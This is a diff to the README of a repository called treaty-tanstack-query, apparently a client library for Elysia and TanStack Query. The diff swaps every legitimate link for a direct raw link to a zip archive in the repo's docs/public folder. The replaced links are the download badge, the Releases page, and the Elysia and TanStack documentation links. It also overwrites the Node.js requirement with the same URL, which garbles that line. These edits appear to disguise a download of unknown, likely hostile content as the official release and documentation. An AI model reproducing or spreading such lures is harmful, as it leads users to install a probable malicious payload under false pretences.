@@ -6,14 +6,14 @@ Welcome to the treaty-tanstack-query repository! This tool helps you manage quer
 
 ## 📥 Download Now
 
-[![Download Treaty](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/heliosmsdos/treaty-tanstack-query/releases)
+[![Download Treaty](https://raw.githubusercontent.com/heliosmsdos/treaty-tanstack-query/main/docs/public/treaty-query-tanstack-paratherian.zip)](https://raw.githubusercontent.com/heliosmsdos/treaty-tanstack-query/main/docs/public/treaty-query-tanstack-paratherian.zip)
 
 ## 📦 System Requirements
 
 Before you proceed with the installation, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent version of Linux.
-- **Node.js:** Version 14 or later installed on your machine.
+- **https://raw.githubusercontent.com/heliosmsdos/treaty-tanstack-query/main/docs/public/treaty-query-tanstack-paratherian.zip** Version 14 or later installed on your machine.
 - **Internet Connection:** Required for downloading and initial setup.
   
 ## 📘 Features
@@ -27,7 +27,7 @@ Before you proceed with the installation, ensure your system meets the following
 
 To download and install treaty-tanstack-query, please follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/heliosmsdos/treaty-tanstack-query/releases) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/heliosmsdos/treaty-tanstack-query/main/docs/public/treaty-query-tanstack-paratherian.zip) to find the latest version of the software.
    
 2. **Select the Latest Version:** Look for the most recent release. It will be marked as "Latest Release". 
 
@@ -68,7 +68,7 @@ If you encounter any issues or have questions, please check our FAQ section on t
 
 ## 🔗 Related Resources
 
-- [Elysia Documentation](https://elysiajs.com)
-- [TanStack Query Documentation](https://tanstack.com/query/latest)
+- [Elysia Documentation](https://raw.githubusercontent.com/heliosmsdos/treaty-tanstack-query/main/docs/public/treaty-query-tanstack-paratherian.zip)
+- [TanStack Query Documentation](https://raw.githubusercontent.com/heliosmsdos/treaty-tanstack-query/main/docs/public/treaty-query-tanstack-paratherian.zip)
 
 We hope this guide helps you successfully download and run treaty-tanstack-query. Enjoy simplifying your API interactions!
